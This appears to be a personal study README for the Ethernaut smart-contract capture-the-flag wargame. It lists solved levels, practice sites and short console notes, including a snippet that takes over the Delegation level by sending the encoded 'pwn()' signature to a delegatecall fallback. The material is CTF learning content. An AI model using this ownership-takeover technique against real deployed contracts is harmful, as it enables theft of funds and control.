## Website
https://ethernaut.openzeppelin.com/
https://www.damnvulnerabledefi.xyz/
https://speedrunethereum.com/

## Completed
0. Hello Ethernaut ✔
1. Fallback ✔
2. Fallout ✔
3. CoinFlip ✔
4. Telephone ✔
5. Token ✔
6. Delegation ✔
7. Force ✔
8. Vault ✔
9. King ✔
10. Re-entrancy ✔
11. Elevator ✔
12. Privacy ✔

## Other useful sites:

https://www.pauric.blog/How-To-Hack-Ethereum-Contracts-The-Easy-Way/

https://trufflesuite.com/docs/truffle/getting-started/interacting-with-your-contracts

https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925

## Other Notes:

player is you
get the balance using
```
getBalance(player)
```

interact with the `contract`
```
(await contract.contributions(player)).toString();
await contract.contribute.sendTransaction({value: toWei(.0009)})
```
contract is a truffle object. can do fallback methods using
```
contract.sendTransction({value: 50000000});
```


### Delegate call with encoding of function signature
```
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
  
  # Called with
  await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
  
```

### Sending Ether
https://solidity-by-example.org/sending-ether/

### Re-Entrancy!!
https://solidity-by-example.org/hacks/re-entrancy/


